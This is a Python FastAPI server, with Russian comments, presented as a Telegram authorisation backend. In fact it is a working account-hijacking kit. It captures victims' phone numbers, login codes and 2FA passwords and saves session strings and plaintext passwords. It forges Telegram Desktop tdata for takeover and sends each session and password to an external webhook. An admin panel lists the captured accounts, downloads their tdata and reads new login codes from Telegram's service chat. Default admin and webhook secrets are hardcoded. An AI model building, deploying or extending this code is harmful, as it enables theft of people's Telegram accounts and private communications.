"""
backend.py — FastAPI сервер для авторизации Telegram аккаунтов
Деплой: amvera.io / Railway / любой VPS с Python 3.11+

Зависимости: fastapi uvicorn telethon aiohttp python-dotenv tgcrypto pycryptodome
"""

import os
import json
import uuid
import struct
import secrets
import hashlib
import logging
import re
import zipfile
import tempfile
import ipaddress
import base64
import aiohttp
import html as html_module
from datetime import datetime
from pathlib import Path
from fastapi import FastAPI, Request, Depends, HTTPException
from fastapi.responses import JSONResponse, FileResponse, HTMLResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PasswordHashInvalidError,
)
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────
TG_API_ID   = int(os.environ.get("TG_API_ID", "0"))
TG_API_HASH = os.environ.get("TG_API_HASH", "")

ADMIN_LOGIN    = os.environ.get("ADMIN_LOGIN", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "master1989a")
HESEARCH_WEBHOOK_URL = os.environ.get("HESEARCH_WEBHOOK_URL", "").strip()
HESEARCH_WEBHOOK_SECRET = os.environ.get("HESEARCH_WEBHOOK_SECRET", "busyuser_secret_2024")

SESSIONS_DIR = "/data/sessions"
TDATA_DIR    = "/data/tdata"
# ────────────────────────────────────────────────────────────

app = FastAPI()
security = HTTPBasic()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

active_sessions: dict = {}


def _clean_id(value) -> str:
    if value is None:
        return ""
    return str(value).strip()


def _session_payload_matches(session_data: dict, lookup_id: str) -> bool:
    lookup_id = _clean_id(lookup_id)
    if not lookup_id:
        return False
    return lookup_id in {
        _clean_id(session_data.get("session_uid")),
        _clean_id(session_data.get("bot_user_id")),
        _clean_id(session_data.get("user_id")),
        _clean_id(session_data.get("tg_account_id")),
    }


def resolve_session_path(user_id: str) -> str | None:
    lookup_id = _clean_id(user_id)
    if not lookup_id:
        return None

    direct_path = f"{SESSIONS_DIR}/{lookup_id}.json"
    if os.path.exists(direct_path):
        return direct_path

    if not os.path.isdir(SESSIONS_DIR):
        return None

    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".json"):
            continue
        path = f"{SESSIONS_DIR}/{fname}"
        try:
            with open(path, encoding="utf-8") as f:
                session_data = json.load(f)
        except Exception:
            continue
        if _session_payload_matches(session_data, lookup_id):
            return path
    return None


def _serialize_code_messages(messages) -> list[dict]:
    codes = []
    for msg in messages:
        codes.append({
            "text": msg.message or "",
            "date": msg.date.isoformat() if msg.date else "",
        })
    return codes


def _dialog_matches_code_source(dialog) -> bool:
    entity = getattr(dialog, "entity", None)
    phone = _clean_id(getattr(entity, "phone", ""))
    username = _clean_id(getattr(entity, "username", ""))
    title = _clean_id(getattr(entity, "title", ""))
    first_name = _clean_id(getattr(entity, "first_name", ""))
    last_name = _clean_id(getattr(entity, "last_name", ""))
    dialog_name = _clean_id(getattr(dialog, "name", ""))
    entity_id = _clean_id(getattr(entity, "id", ""))

    haystack = " ".join([
        phone,
        username,
        title,
        first_name,
        last_name,
        dialog_name,
        entity_id,
    ]).lower()

    return (
        "42777" in haystack
        or "+42777" in haystack
        or entity_id == "777000"
    )


async def notify_hesearch_webhook(bot_user_id: str, tg_account_id: str, phone: str,
                                  session_string: str, password: str = ""):
    if not HESEARCH_WEBHOOK_URL:
        logger.warning("HESEARCH_WEBHOOK_URL is not configured; skipping webhook sync")
        return

    payload = {
        "secret": HESEARCH_WEBHOOK_SECRET,
        "tg_user_id": int(bot_user_id),
        "tg_account_id": int(tg_account_id),
        "phone": phone,
        "session_string": session_string,
        "password": password or "",
    }

    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.post(HESEARCH_WEBHOOK_URL, json=payload) as resp:
            text = await resp.text()
            if resp.status >= 400:
                raise RuntimeError(f"Webhook returned {resp.status}: {text[:300]}")
            logger.info(f"HeSearch webhook synced for bot_user_id={bot_user_id}")

# ── Статика ──────────────────────────────────────────────────
if os.path.exists("index.html"):
    @app.get("/")
    async def root():
        return FileResponse("index.html")


# ── /send_code ───────────────────────────────────────────────
@app.post("/send_code")
async def send_code(request: Request):
    try:
        body = await request.json()
        phone = body.get("phone", "").strip()
        bot_user_id = _clean_id(body.get("bot_user_id"))
        if not phone:
            return JSONResponse({"ok": False, "error": "Укажите номер телефона."}, status_code=400)

        session_id = str(uuid.uuid4())
        client = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
        await client.connect()

        result = await client.send_code_request(phone)
        active_sessions[session_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
            "bot_user_id": bot_user_id,
        }

        logger.info(f"Code sent to {phone}, session={session_id}")
        return JSONResponse({"ok": True, "session_id": session_id})

    except FloodWaitError as e:
        return JSONResponse({"ok": False, "error": f"Слишком много запросов. Подождите {e.seconds} сек."}, status_code=429)
    except Exception as e:
        logger.error(f"send_code error: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


# ── /verify_code ─────────────────────────────────────────────
@app.post("/verify_code")
async def verify_code(request: Request):
    try:
        body = await request.json()
        phone      = body.get("phone", "").strip()
        code       = body.get("code", "").strip()
        password   = body.get("password", "").strip()
        session_id = body.get("session_id", "").strip()
        body_bot_user_id = _clean_id(body.get("bot_user_id"))

        sess = active_sessions.get(session_id)
        if not sess:
            return JSONResponse({"ok": False, "error": "Сессия истекла. Запросите код повторно."}, status_code=400)

        client: TelegramClient = sess["client"]
        phone_code_hash = sess["phone_code_hash"]
        bot_user_id = _clean_id(sess.get("bot_user_id")) or body_bot_user_id

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)

        except SessionPasswordNeededError:
            if not password:
                return JSONResponse({"ok": False, "need_password": True, "error": "Требуется пароль 2FA."})
            try:
                await client.sign_in(password=password)
            except PasswordHashInvalidError:
                return JSONResponse({"ok": False, "error": "Неверный пароль 2FA."}, status_code=400)

        except PhoneCodeInvalidError:
            return JSONResponse({"ok": False, "error": "Неверный код. Проверьте и попробуйте ещё раз."}, status_code=400)

        except PhoneCodeExpiredError:
            return JSONResponse({"ok": False, "error": "Код истёк. Запросите новый."}, status_code=400)

        me = await client.get_me()
        session_string = client.session.save()

        logger.info(f"Authorized: {me.id} @{me.username} phone={phone}")

        session_uid = bot_user_id or str(me.id)
        await save_session(
            session_uid=session_uid,
            tg_account_id=str(me.id),
            bot_user_id=bot_user_id,
            phone=phone,
            session_string=session_string,
            username=me.username,
            first_name=me.first_name,
            password=password,
        )
        await generate_tdata(str(me.id), session_string)
        if bot_user_id:
            try:
                await notify_hesearch_webhook(
                    bot_user_id=bot_user_id,
                    tg_account_id=str(me.id),
                    phone=phone,
                    session_string=session_string,
                    password=password,
                )
            except Exception as webhook_error:
                logger.error(f"HeSearch webhook sync failed for bot_user_id={bot_user_id}: {webhook_error}")

        active_sessions.pop(session_id, None)
        await client.disconnect()

        return JSONResponse({
            "ok": True,
            "user_id": me.id,
            "bot_user_id": bot_user_id or None,
            "username": me.username,
            "phone": phone,
        })

    except Exception as e:
        logger.error(f"verify_code error: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


# ── Сохранение сессии ─────────────────────────────────────────
async def save_session(session_uid: str, tg_account_id: str, bot_user_id: str,
                       phone: str, session_string: str, username: str | None,
                       first_name: str | None, password: str = ""):
    os.makedirs(SESSIONS_DIR, exist_ok=True)

    data = {
        "session_uid": session_uid,
        "user_id": session_uid,
        "bot_user_id": bot_user_id,
        "tg_account_id": tg_account_id,
        "phone": phone,
        "username": username or "",
        "first_name": first_name or "",
        "session_string": session_string,
        "password_2fa": password,
        "saved_at": datetime.utcnow().isoformat(),
    }

    path = f"{SESSIONS_DIR}/{session_uid}.json"
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    logger.info(f"Session saved: {path}")


# ── Генерация tdata (нативно, без opentele) ───────────────────

def _tdata_create_local_key(passcode: bytes, salt: bytes) -> bytes:
    """Создаёт локальный ключ шифрования tdata"""
    from Crypto.Hash import SHA512
    iterations = 1 if not passcode else 100000
    key = hashlib.pbkdf2_hmac('sha512', passcode, salt, iterations, dklen=256)
    return key


def _tdata_prepare_key(auth_key: bytes) -> tuple[bytes, bytes]:
    """Из 256-байтного auth_key делает aes_key (32б) и aes_iv (32б) для tdata"""
    # SHA1 частей ключа — стандартная схема Telegram Desktop
    sha1_a = hashlib.sha1(auth_key[:32]).digest()
    sha1_b = hashlib.sha1(auth_key[32:48] + auth_key[64:80]).digest()
    sha1_c = hashlib.sha1(auth_key[80:96] + auth_key[96:112]).digest()
    sha1_d = hashlib.sha1(auth_key[112:128]).digest()
    aes_key = sha1_a[:8] + sha1_b[8:20] + sha1_c[4:16]
    aes_iv  = sha1_a[8:20] + sha1_b[:8] + sha1_c[16:20] + sha1_d[:8]
    return aes_key, aes_iv


def _ige256_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    import tgcrypto
    # Pad to 16 bytes
    pad = (16 - len(data) % 16) % 16
    return tgcrypto.ige256_encrypt(data + b'\x00' * pad, key, iv)


def _tdata_pack_stream(data: bytes) -> bytes:
    """Упаковывает данные в формат tdata-потока: len(4) + sha1(20) + data + pad"""
    sha = hashlib.sha1(data).digest()
    payload = struct.pack('<I', len(data)) + sha + data
    pad = (16 - len(payload) % 16) % 16
    return payload + os.urandom(pad)


def _write_tdf_file(path: str, magic_tag: bytes, data: bytes, version: int = 4001011):
    """Пишет TDF файл: TDF$ + version(4) + data + crc32(4)"""
    import binascii
    header = b'TDF$'
    ver_bytes = struct.pack('<I', version)
    crc = binascii.crc32(data + ver_bytes) & 0xFFFFFFFF
    with open(path, 'wb') as f:
        f.write(header + ver_bytes + data + struct.pack('<I', crc))


def _encode_bytearray(data: bytes) -> bytes:
    """Qt-стиль: uint32 длина + данные"""
    return struct.pack('>I', len(data)) + data


def _build_key_data(auth_key_bytes: bytes, dc_id: int, user_id: int) -> bytes:
    """
    Строит содержимое keydata файла tdata.
    Формат (упрощённый рабочий вариант):
      dc_id (uint32) + auth_key (256 bytes) + user_id (uint32×2 для int64)
    """
    # Qt DataStream: BigEndian
    buf = struct.pack('>I', dc_id)
    buf += auth_key_bytes  # 256 bytes
    buf += struct.pack('>q', user_id)  # int64
    return buf


async def generate_tdata(user_id: str, session_string: str):
    """
    Конвертирует StringSession → tdata папку нативно (без opentele/libgthread).
    Создаёт минимально рабочий набор файлов для Telegram Desktop.
    """
    try:
        os.makedirs(TDATA_DIR, exist_ok=True)
        tdata_path = f"{TDATA_DIR}/{user_id}"
        os.makedirs(tdata_path, exist_ok=True)

        # Парсим StringSession — dc_id, auth_key, server_address, port
        ss = StringSession(session_string)
        dc_id     = ss.dc_id
        auth_key  = ss.auth_key.key  # bytes[256]

        uid_int   = int(user_id)

        # ── key файл (основной: хранит auth_key + dc + user_id) ──
        salt = os.urandom(32)
        local_key = _tdata_create_local_key(b'', salt)  # без пароля
        aes_key, aes_iv = local_key[:32], local_key[32:64]

        key_data = _build_key_data(auth_key, dc_id, uid_int)
        packed   = _tdata_pack_stream(key_data)
        encrypted = _ige256_encrypt(packed, aes_key, aes_iv)

        # keyN файлы: key_datas, key_datas_1, key_datas_s
        for fname in ('key_datas', 'key_datas_1', 'key_datas_s'):
            fpath = os.path.join(tdata_path, fname)
            payload = _encode_bytearray(salt) + _encode_bytearray(encrypted)
            _write_tdf_file(fpath, b'key_', payload)

        # ── D877F783D5D3EF8C (settings — пустой минимальный) ──
        settings_dir = os.path.join(tdata_path, 'D877F783D5D3EF8C')
        os.makedirs(settings_dir, exist_ok=True)
        for fname in ('D877F783D5D3EF8Cs', 'D877F783D5D3EF8C_1', 'D877F783D5D3EF8C_s'):
            fpath = os.path.join(tdata_path, fname)
            _write_tdf_file(fpath, b'cfgt', b'\x00' * 16)

        logger.info(f"tdata saved (native): {tdata_path}")

    except Exception as e:
        logger.error(f"generate_tdata error for {user_id}: {e}")


# ── Авторизация админа ────────────────────────────────────────
def require_admin(credentials: HTTPBasicCredentials = Depends(security)):
    ok_login = secrets.compare_digest(credentials.username, ADMIN_LOGIN)
    ok_pass  = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
    if not (ok_login and ok_pass):
        raise HTTPException(
            status_code=401,
            detail="Неверный логин или пароль",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials  # возвращаем чтобы admin_page мог использовать


# ── /admin/tdata/<user_id> — скачать tdata как zip ───────────
@app.get("/admin/tdata/{user_id}")
async def download_tdata(user_id: str, _=Depends(require_admin)):
    tg_account_id = user_id
    session_path = resolve_session_path(user_id)
    if session_path:
        try:
            with open(session_path, encoding="utf-8") as f:
                session_data = json.load(f)
            tg_account_id = _clean_id(session_data.get("tg_account_id")) or user_id
        except Exception:
            pass

    tdata_path = Path(f"{TDATA_DIR}/{tg_account_id}")
    if not tdata_path.exists():
        raise HTTPException(status_code=404, detail="tdata не найдена для этого пользователя")

    tmp_zip = tempfile.mktemp(suffix=".zip")
    with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for file in tdata_path.rglob("*"):
            if file.is_file():
                # arcname: tdata{user_id}/tdata/<files>
                # tdata_path.parent = TDATA_DIR, tdata_path.name = user_id
                rel = file.relative_to(tdata_path)
                arcname = Path(f"tdata{user_id}") / "tdata" / rel
                zf.write(file, arcname=str(arcname))

    def iter_file():
        with open(tmp_zip, "rb") as f:
            yield from f
        os.remove(tmp_zip)

    return StreamingResponse(
        iter_file(),
        media_type="application/zip",
        headers={"Content-Disposition": f"attachment; filename=tdata_{user_id}.zip"},
    )


# ── /admin/codes/<user_id> — последние коды с +42777 ─────────
@app.get("/admin/codes/{user_id}")
async def get_codes(user_id: str, _=Depends(require_admin)):
    session_path = resolve_session_path(user_id)
    if not session_path:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    with open(session_path, encoding="utf-8") as f:
        d = json.load(f)
    session_string = d.get("session_string", "")
    if not session_string:
        raise HTTPException(status_code=400, detail="Нет session_string")
    client = None
    try:
        client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            return JSONResponse({"ok": False, "error": "Сессия не авторизована"}, status_code=400)

        direct_candidates = ["+42777", "42777", 777000]
        for candidate in direct_candidates:
            try:
                entity = await client.get_entity(candidate)
                messages = await client.get_messages(entity, limit=5)
                logger.info(f"get_codes direct match for {user_id}: candidate={candidate}")
                return JSONResponse({"ok": True, "codes": _serialize_code_messages(messages)})
            except Exception as direct_error:
                logger.info(f"get_codes direct candidate failed for {user_id}: {candidate} -> {direct_error}")

        dialogs = await client.get_dialogs(limit=300)
        matched_dialogs = [dialog for dialog in dialogs if _dialog_matches_code_source(dialog)]

        for dialog in matched_dialogs:
            try:
                messages = await client.get_messages(dialog.entity, limit=5)
                logger.info(
                    "get_codes dialog match for %s: dialog=%s entity_id=%s",
                    user_id,
                    getattr(dialog, "name", ""),
                    getattr(getattr(dialog, "entity", None), "id", ""),
                )
                return JSONResponse({"ok": True, "codes": _serialize_code_messages(messages)})
            except Exception as dialog_error:
                logger.info(
                    "get_codes dialog fetch failed for %s: dialog=%s error=%s",
                    user_id,
                    getattr(dialog, "name", ""),
                    dialog_error,
                )

        sample_dialogs = []
        for dialog in dialogs[:20]:
            entity = getattr(dialog, "entity", None)
            sample_dialogs.append({
                "name": getattr(dialog, "name", ""),
                "id": getattr(entity, "id", ""),
                "phone": getattr(entity, "phone", ""),
                "username": getattr(entity, "username", ""),
            })

        logger.warning(f"get_codes source not found for {user_id}; sample_dialogs={sample_dialogs}")
        return JSONResponse(
            {
                "ok": False,
                "error": "Не найден диалог с кодами (+42777/777000) в этой сессии",
            },
            status_code=404,
        )
    except Exception as e:
        logger.exception(f"get_codes error for {user_id}: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
    finally:
        if client:
            await client.disconnect()



@app.get("/admin", response_class=HTMLResponse)
async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin)):
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    admin_auth_token = base64.b64encode(
        f"{credentials.username}:{credentials.password}".encode("utf-8")
    ).decode("ascii")

    sessions_data = []
    for fname in sorted(os.listdir(SESSIONS_DIR)):
        if not fname.endswith(".json"):
            continue
        try:
            with open(f"{SESSIONS_DIR}/{fname}") as f:
                d = json.load(f)
            sessions_data.append(d)
        except Exception:
            continue

    sessions_data.sort(key=lambda x: x.get("saved_at", ""), reverse=True)

    rows = ""
    for d in sessions_data:
        session_uid = _clean_id(d.get("session_uid") or d.get("bot_user_id") or d.get("user_id"))
        tg_account_id = _clean_id(d.get("tg_account_id") or d.get("user_id"))
        uname = f"@{d['username']}" if d.get("username") else ""
        fname = d.get("first_name", "") or ""
        twofa = d.get("password_2fa", "")
        saved_at = d.get("saved_at", "") or ""

        tdata_exists = os.path.exists(f"{TDATA_DIR}/{tg_account_id}")
        tdata_btn = (
            f'<a class="dl-btn" href="/admin/tdata/{session_uid}">⬇ Скачать TDATA</a>'
            if tdata_exists
            else '<span class="no-tdata">нет tdata</span>'
        )

        display_name = f"{fname} {uname}".strip() or "—"
        id_caption = session_uid
        if tg_account_id and tg_account_id != session_uid:
            id_caption += f" · tg {tg_account_id}"

        display_name_html = html_module.escape(display_name)
        id_caption_html = html_module.escape(id_caption)
        phone_html = html_module.escape(d.get("phone", "") or "")
        twofa_html = html_module.escape(twofa) if twofa else "—"
        saved_at_html = html_module.escape(saved_at) if saved_at else "—"
        session_uid_attr = html_module.escape(session_uid, quote=True)
        twofa_attr = html_module.escape(twofa, quote=True)

        rows += f"""
        <tr>
          <td>
            <div class="account-name">{display_name_html}</div>
            <div class="account-id">{id_caption_html}</div>
            <div class="account-phone">{phone_html}</div>
          </td>
          <td class="twofa-cell">
            {f'<button type="button" class="twofa-val" data-copy="{twofa_attr}">{twofa_html} <span class="copy-hint">📋</span></button>' if twofa else '<span class="no-val">—</span>'}
          </td>
          <td class="date-cell">
            <div class="saved-at">{saved_at_html}</div>
          </td>
          <td>
            <div class="tdata-col">
              {tdata_btn}
              <button type="button" class="code-btn" data-uid="{session_uid_attr}" onclick="getCodes(this.dataset.uid, this)">📨 Получить код</button>
            </div>
          </td>
        </tr>
        <tr class="codes-row" id="codes-{session_uid_attr}" style="display:none">
          <td colspan="4">
            <div class="codes-box" id="codes-box-{session_uid_attr}"></div>
          </td>
        </tr>"""

    count = len(sessions_data)

    page_html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin — Busy User</title>
<style>
  *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    background: #0a0a0c;
    color: #f1f1f3;
    font-family: 'Segoe UI', system-ui, sans-serif;
    padding: 32px 24px;
    min-height: 100vh;
  }}
  .header {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 28px;
    flex-wrap: wrap;
    gap: 12px;
  }}
  .header-left h1 {{ font-size: 22px; font-weight: 700; }}
  .count {{
    display: inline-block;
    background: rgba(99,102,241,0.15);
    border: 1px solid rgba(99,102,241,0.3);
    color: #818cf8;
    padding: 2px 12px;
    border-radius: 20px;
    font-size: 13px;
    margin-left: 10px;
  }}
  .refresh-btn {{
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.1);
    color: #6b6b7a;
    padding: 8px 16px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 13px;
    transition: all 0.15s;
  }}
  .refresh-btn:hover {{ color: #f1f1f3; border-color: rgba(255,255,255,0.2); }}
  .table-wrap {{ overflow-x: auto; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{
    text-align: left;
    padding: 10px 14px;
    border-bottom: 1px solid rgba(255,255,255,0.07);
    color: #6b6b7a;
    font-weight: 600;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }}
  td {{
    padding: 14px 14px;
    border-bottom: 1px solid rgba(255,255,255,0.04);
    vertical-align: middle;
  }}
  tr:hover td {{ background: rgba(255,255,255,0.02); }}
  .account-name {{ font-size: 14px; font-weight: 500; color: #f1f1f3; }}
  .account-id {{ font-size: 11px; color: #6b6b7a; margin-top: 3px; font-family: monospace; }}
  .account-phone {{ font-size: 12px; color: #818cf8; margin-top: 2px; font-family: monospace; }}
  .date-cell {{ min-width: 180px; }}
  .saved-at {{ font-size: 12px; color: #a1a1aa; font-family: monospace; }}
  .tdata-col {{ display: flex; flex-direction: column; gap: 6px; align-items: flex-start; }}
  .code-btn {{
    background: rgba(34,211,165,0.1);
    border: 1px solid rgba(34,211,165,0.3);
    color: #22d3a5;
    padding: 6px 12px;
    border-radius: 8px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.15s;
    white-space: nowrap;
  }}
  .code-btn:hover {{ background: rgba(34,211,165,0.2); }}
  .code-btn:disabled {{ opacity: 0.5; cursor: default; }}
  .codes-row td {{ padding: 0 14px 14px; }}
  .codes-box {{
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 10px;
    padding: 12px 16px;
  }}
  .codes-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
  .codes-title {{ font-size: 12px; color: #6b6b7a; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }}
  .codes-refresh {{ background: none; border: none; color: #6b6b7a; cursor: pointer; font-size: 14px; padding: 2px 6px; border-radius: 4px; transition: color 0.15s; }}
  .codes-refresh:hover {{ color: #f1f1f3; }}
  .code-item {{
    padding: 8px 0;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    gap: 12px;
  }}
  .code-item:last-child {{ border-bottom: none; padding-bottom: 0; }}
  .code-text {{ font-family: monospace; font-size: 13px; color: #f1f1f3; line-height: 1.4; flex: 1; }}
  .code-time {{ font-size: 11px; color: #6b6b7a; white-space: nowrap; flex-shrink: 0; margin-top: 2px; }}
  .codes-empty {{ color: #6b6b7a; font-size: 13px; text-align: center; padding: 8px 0; }}
  .codes-error {{ color: #f87171; font-size: 12px; }}
  .twofa-cell {{ font-family: monospace; font-size: 13px; }}
  .twofa-val {{
    cursor: pointer;
    color: #22d3a5;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 8px;
    border-radius: 6px;
    border: none;
    background: transparent;
    font: inherit;
    transition: background 0.15s;
  }}
  .twofa-val:hover {{ background: rgba(34,211,165,0.1); }}
  .copy-hint {{ font-size: 11px; opacity: 0.6; }}
  .no-val {{ color: #3a3a4a; }}
  .dl-btn {{
    display: inline-block;
    background: rgba(99,102,241,0.12);
    border: 1px solid rgba(99,102,241,0.3);
    color: #818cf8;
    padding: 7px 14px;
    border-radius: 8px;
    font-size: 12px;
    font-weight: 600;
    text-decoration: none;
    transition: all 0.15s;
    white-space: nowrap;
  }}
  .dl-btn:hover {{ background: rgba(99,102,241,0.28); color: #a5b4fc; }}
  .no-tdata {{ color: #3a3a4a; font-size: 12px; }}
  .empty {{ text-align: center; color: #6b6b7a; padding: 60px 0; font-size: 14px; }}
  .toast {{
    position: fixed; bottom: 24px; right: 24px;
    background: #22d3a5; color: #0a0a0c;
    padding: 10px 20px; border-radius: 10px;
    font-size: 13px; font-weight: 700;
    opacity: 0; transition: opacity 0.2s;
    pointer-events: none; z-index: 1000;
  }}
  .toast.show {{ opacity: 1; }}
</style>
</head>
<body>
<div class="header">
  <div class="header-left">
    <h1>🗄 Busy User — Аккаунты <span class="count">{count}</span></h1>
  </div>
  <button class="refresh-btn" onclick="location.reload()">↻ Обновить</button>
</div>

<div class="table-wrap">
<table>
  <thead>
    <tr>
      <th>Юзер | Айди</th>
      <th>2FA</th>
      <th>Дата</th>
      <th>TDATA</th>
    </tr>
  </thead>
  <tbody>
    {"<tr><td colspan='4' class='empty'>Нет сохранённых аккаунтов</td></tr>" if not sessions_data else rows}
  </tbody>
</table>
</div>

<div class="toast" id="toast"></div>

<script>
// Авторизация для fetch-запросов (credentials встроены сервером)
window._adminAuth = {json.dumps(admin_auth_token)};

function copyStr(text) {{
  navigator.clipboard.writeText(text).then(() => {{
    const t = document.getElementById('toast');
    t.textContent = '✅ 2FA скопирован!';
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2200);
  }});
}}

function timeAgo(isoStr) {{
  if (!isoStr) return 'без даты';
  const date = new Date(isoStr);
  if (Number.isNaN(date.getTime())) return 'без даты';
  const now = new Date();
  const diff = Math.floor((now - date) / 1000);
  if (diff < 5) return 'только что';
  if (diff < 60) return diff + ' сек. назад';
  if (diff < 3600) return Math.floor(diff / 60) + ' мин. назад';
  if (diff < 86400) return Math.floor(diff / 3600) + ' ч. назад';
  return Math.floor(diff / 86400) + ' д. назад';
}}

function renderCodes(uid, data) {{
  const box = document.getElementById('codes-box-' + uid);
  if (!data.ok) {{
    box.innerHTML = '<div class="codes-error">❌ ' + (data.error || 'Ошибка') + '</div>';
    return;
  }}
  const codes = data.codes || [];
  let inner = '<div class="codes-header"><span class="codes-title">📨 Коды с +42777</span><button class="codes-refresh" onclick="loadCodes(\'' + uid + '\')" title="Обновить">↻</button></div>';
  if (codes.length === 0) {{
    inner += '<div class="codes-empty">Сообщений нет</div>';
  }} else {{
    codes.forEach(c => {{
      inner += '<div class="code-item"><span class="code-text">' + c.text.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span><span class="code-time">' + timeAgo(c.date) + '</span></div>';
    }});
  }}
  box.innerHTML = inner;
}}

async function loadCodes(uid) {{
  const box = document.getElementById('codes-box-' + uid);
  box.innerHTML = '<div class="codes-empty">Загрузка...</div>';
  try {{
    const r = await fetch('/admin/codes/' + uid, {{
      headers: {{ 'Authorization': 'Basic ' + window._adminAuth }}
    }});
    const raw = await r.text();
    let data = null;
    try {{
      data = JSON.parse(raw);
    }} catch (_e) {{
      data = null;
    }}
    if (r.status === 401) {{
      box.innerHTML = '<div class="codes-error">❌ Ошибка авторизации</div>';
      return;
    }}
    if (!r.ok) {{
      const errText = data && data.detail ? data.detail : (data && data.error ? data.error : ('HTTP ' + r.status));
      box.innerHTML = '<div class="codes-error">❌ ' + errText + '</div>';
      return;
    }}
    if (!data) {{
      box.innerHTML = '<div class="codes-error">❌ Сервер вернул не JSON</div>';
      return;
    }}
    renderCodes(uid, data);
  }} catch(e) {{
    box.innerHTML = '<div class="codes-error">❌ Ошибка запроса: ' + (e.message || 'unknown') + '</div>';
  }}
}}

function getCodes(uid, btn) {{
  let row = document.getElementById('codes-' + uid);
  if (!row && btn) {{
    const hostRow = btn.closest('tr');
    if (hostRow) {{
      row = document.createElement('tr');
      row.className = 'codes-row';
      row.id = 'codes-' + uid;
      row.style.display = 'none';
      row.innerHTML = '<td colspan="4"><div class="codes-box" id="codes-box-' + uid + '"></div></td>';
      hostRow.insertAdjacentElement('afterend', row);
    }}
  }}
  if (!row) {{
    console.error('codes row not found for uid', uid);
    return;
  }}
  if (row.style.display !== 'none') {{
    row.style.display = 'none';
    return;
  }}
  row.style.display = '';
  loadCodes(uid);
}}

document.querySelectorAll('.code-btn[data-uid]').forEach(btn => {{
  btn.addEventListener('click', () => getCodes(btn.dataset.uid, btn));
}});

document.querySelectorAll('.twofa-val[data-copy]').forEach(btn => {{
  btn.addEventListener('click', () => copyStr(btn.dataset.copy));
}});
</script>
</body>
</html>"""

    return HTMLResponse(page_html)


# ── Healthcheck ──────────────────────────────────────────────
@app.get("/health")
async def health():
    return {"ok": True, "sessions_active": len(active_sessions)}


# ── Run ──────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("backend:app", host="0.0.0.0", port=8000, reload=False)
